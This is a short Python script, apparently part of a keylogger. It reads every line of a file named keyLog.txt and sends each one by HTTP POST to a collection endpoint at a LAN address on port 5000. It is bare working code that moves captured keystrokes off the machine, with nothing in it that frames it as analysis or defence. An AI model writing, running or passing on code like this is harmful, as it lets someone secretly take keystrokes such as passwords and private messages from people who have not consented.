import requests

def postlog():
    f = open("keyLog.txt",'a')
    f.close()
    file = open("keyLog.txt",'r')
    cont = file.readlines()
    for i in cont:
        lin = i.rstrip('\n')
        url = "http://192.168.0.107:5000/logs"
        payload = 'command='+lin
        headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }
        response = requests.request("POST", url, headers=headers, data=payload)
        
postlog()